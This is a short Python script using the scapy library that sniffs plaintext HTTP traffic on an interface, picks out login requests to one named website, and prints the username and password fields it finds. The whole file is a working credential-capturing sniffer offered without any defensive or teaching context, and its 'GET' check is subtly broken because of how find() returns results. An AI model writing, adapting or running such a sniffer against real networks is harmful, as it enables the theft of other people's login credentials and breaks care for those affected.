from scapy.all import *

def http_header(packet):
        http_packet=str(packet)
        if http_packet.find('GET'):
                return GET_print(packet)

def GET_print(packet1):
    #storing packet deets
    ret = "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))

    origin = 'http://www.snackwebsites.com'
    #checking
    if origin in ret:
        if 'login' in ret:
            user = 'user'
            password = 'pass'
            #split the packet at '&' for breaking the query,then analysing
            ret_words = ret.split('&')

            for word in ret_words:
                if (user in word):
                    print word
                    print '\n'
                if (password in word):
                    print word
                    print '\n'

sniff(iface='eth0', prn=http_header, filter ='tcp port 80')
